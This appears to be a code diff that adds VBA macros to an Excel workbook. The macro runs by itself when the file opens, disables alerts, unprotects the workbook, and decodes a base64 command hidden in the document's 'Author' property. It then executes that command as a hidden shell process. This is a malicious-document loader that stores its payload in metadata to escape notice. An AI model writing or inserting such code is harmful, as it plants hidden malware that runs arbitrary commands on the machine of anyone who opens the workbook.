@@ -1,0 +1,16 @@
+Private Sub Workbook_Open()
+    Application.DisplayAlerts = False
+    ThisWorkbook.Unprotect
+    On Error GoTo 10
+    Application.OnTime Now + TimeValue("00:00:01"), "Launch"
+    
+    Exit Sub
+10:     Launch
+    Resume Next
+End Sub
+Sub Launch()
+    b_64 = ThisWorkbook.BuiltinDocumentProperties("Author")
+    strCommand = Base64DecodeString(b_64)
+    Call Shell(strCommand, vbHide)
+End Sub
+
